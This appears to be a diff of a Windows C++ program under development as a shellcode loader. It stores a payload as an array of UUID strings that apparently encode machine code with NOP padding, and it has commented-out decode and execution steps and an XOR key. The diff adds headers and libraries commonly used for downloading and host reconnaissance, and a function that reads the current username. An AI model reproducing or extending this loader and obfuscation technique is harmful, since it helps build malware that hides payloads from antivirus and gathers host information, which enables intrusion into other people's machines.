@@ -1,9 +1,23 @@
-#include <windows.h>
-#include <rpc.h>
+#include <winsock2.h>
+#include <Windows.h>
+#include <ws2tcpip.h>
 #include <stdio.h>
+#include <tlhelp32.h>
+#include <iostream>
+#include <sstream>
+#include <Lmcons.h>
+#include <wininet.h>
+#include <winsock.h>
+#include <iptypes.h>
+#include <iphlpapi.h>
 #include <string.h>
-#include <rpcdce.h>
-#pragma comment(lib, "rpcrt4.lib")
+#include <rpc.h>
+#pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "Wininet.lib")
+#pragma comment(lib, "IPHLPAPI.lib")
+#pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "Rpcrt4.lib")
+
 
 #define PORT "25565" //Default port for Minecraft Java
 #define SERV_ADDR "127.0.0.1"
@@ -91,6 +105,23 @@ int decode(char** data, int elements) {
 	return 0;
 }*/
 
+std::string getUsername() {
+    DWORD bufferSize = 0;
+    GetUserNameA(NULL, &bufferSize);
+    if (bufferSize == 0) {
+        return "";
+    }
+    char* buffer = new char[bufferSize];
+    if (GetUserNameA(buffer, &bufferSize)) {
+        std::string username(buffer);
+        delete[] buffer;
+        return username;
+    }
+    delete[] buffer;
+    return "";
+}
+
+
 int main() {
 	
 	//char *[2]{(char *)(char *)((const char [37])"54686973-4973-416e-584f-526b65793031"), 
@@ -120,6 +151,8 @@ int main() {
 		"41c93148-f0ba-a2b5-56ff-d54d656f772d",
 		"776f656d-0021-5e3d-2e2e-5e3d00909090"
 	};
+	
+	
 
     int data_elements = sizeof(data) / sizeof(data[0]);
     printf("[main] data's elements: %d\n", data_elements);
@@ -128,10 +161,17 @@ int main() {
 	printf("%s\n", new_data[0]);
 	printf("%s\n", new_data[1]);
 
+	std::string username = getUsername();
+	if (username.empty()){
+		std::cout << "Failed to retrieve username" << std::endl;
+	} else {
+        std::cout << "Username: " << username << std::endl;
+    }
 	
 	//int uuids_elements = sizeof(uuids) / sizeof(uuids[0]);
     //printf("[main] uuids's elements: %d\n", uuids_elements);
 	//dec_uuids(uuids, uuids_elements);
 	//printf("callcode (decrypted): %s\n", *(data + 1));
+	
 	return 0;
 }
